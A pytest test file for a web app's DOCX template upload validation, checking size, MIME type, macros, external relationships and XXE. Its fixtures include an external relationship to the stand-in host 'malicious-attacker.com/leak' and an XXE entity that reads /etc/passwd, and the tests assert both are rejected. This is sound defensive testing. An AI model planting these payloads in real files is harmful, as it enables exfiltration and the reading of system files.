"""Unit tests for template file upload security validation.

Covers:
- Size limits (> 5 MB)
- Extension and MIME type enforcement
- Macro-enabled file rejection (.docm / vbaProject.bin)
- External relationship exfiltration rejection (TargetMode="External")
- Safe XML parsing / XXE injection / defusedxml protections
"""

from __future__ import annotations

import io
import json
import uuid
import zipfile

import pytest
from fastapi.testclient import TestClient

from app.api.auth import get_current_actor
from app.identity.policy import Actor
from app.main import app
from app.templates.lint.structural import (
    MAX_COMPRESSED_SIZE_BYTES,
    check_structural_safety,
)

client = TestClient(app)

TEMPLATE_ADMIN_ACTOR = Actor(
    user_id=uuid.uuid4(),
    tenant_id=uuid.uuid4(),
    email="admin@example.com",
    role="template_admin",
    ui_language="mr",
)


def _make_dummy_docx(files: dict[str, bytes | str]) -> bytes:
    """Builds an in-memory zip archive mimicking a DOCX package."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Default minimal valid parts if not overridden
        if "[Content_Types].xml" not in files:
            zf.writestr(
                "[Content_Types].xml",
                '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
            )
        if "_rels/.rels" not in files:
            zf.writestr(
                "_rels/.rels",
                '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>',
            )
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


@pytest.fixture(autouse=True)
def override_actor():
    app.dependency_overrides[get_current_actor] = lambda: TEMPLATE_ADMIN_ACTOR
    yield
    app.dependency_overrides.pop(get_current_actor, None)


def test_upload_rejects_oversized_file() -> None:
    """Proves file upload > 5 MB is rejected with 400 Bad Request."""
    oversized_bytes = b"0" * (MAX_COMPRESSED_SIZE_BYTES + 1024)

    # 1. Structural check
    findings = check_structural_safety(oversized_bytes)
    assert any(f.code == "FILE_TOO_LARGE" for f in findings)

    # 2. API endpoint check
    res = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "oversized_tmpl", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("test.docx", oversized_bytes, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
    )
    assert res.status_code == 400
    assert "exceeds 5 MB limit" in res.json()["detail"]


def test_upload_rejects_non_docx_extension_and_mime() -> None:
    """Proves non-.docx extension or prohibited MIME type is rejected."""
    valid_zip = _make_dummy_docx({})

    # Rejected extension (.docm)
    res = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "macro_ext", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("template.docm", valid_zip, "application/vnd.ms-word.document.macroEnabled.12")},
    )
    assert res.status_code == 400
    assert "only .docx templates are supported" in res.json()["detail"]

    # Rejected MIME type (e.g. text/plain)
    res2 = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "mime_ext", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("template.docx", valid_zip, "text/plain")},
    )
    assert res2.status_code == 400
    assert "invalid MIME type" in res2.json()["detail"]


def test_upload_rejects_macro_enabled_docx() -> None:
    """Proves DOCX containing VBA project binaries is rejected."""
    macro_docx = _make_dummy_docx({
        "word/vbaProject.bin": b"DUMMY_VBA_CODE",
        "word/document.xml": "<w:document><w:body><w:p/></w:body></w:document>",
    })

    findings = check_structural_safety(macro_docx)
    assert any(f.code == "MACRO_ENABLED_FILE" for f in findings)

    res = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "macro_file", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("template.docx", macro_docx, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
    )
    assert res.status_code == 400
    assert "Macro-enabled" in res.json()["detail"]


def test_upload_rejects_external_relationships() -> None:
    """Proves DOCX with TargetMode='External' is rejected to prevent SSRF/exfiltration."""
    external_rels_docx = _make_dummy_docx({
        "word/_rels/document.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://malicious-attacker.com/leak" TargetMode="External"/>'
            '</Relationships>'
        ),
        "word/document.xml": "<w:document><w:body><w:p/></w:body></w:document>",
    })

    findings = check_structural_safety(external_rels_docx)
    assert any(f.code == "EXTERNAL_RELATIONSHIP_FOUND" for f in findings)

    res = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "ext_rels", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("template.docx", external_rels_docx, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
    )
    assert res.status_code == 400
    assert "External relationship detected" in res.json()["detail"]


def test_upload_rejects_xxe_and_dangerous_entities() -> None:
    """Proves XML with DTD entities or DOCTYPE definitions is rejected."""
    xxe_docx = _make_dummy_docx({
        "word/document.xml": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<w:document><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>'
        ),
    })

    findings = check_structural_safety(xxe_docx)
    assert any(f.code == "DANGEROUS_XML_ENTITY_DECLARATION" for f in findings)

    res = client.post(
        "/api/v1/templates/upload",
        data={"template_id": "xxe_tmpl", "manifest_json": json.dumps({"name": "Test"})},
        files={"docx_file": ("template.docx", xxe_docx, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
    )
    assert res.status_code == 400
    assert "Dangerous XML entity" in res.json()["detail"]

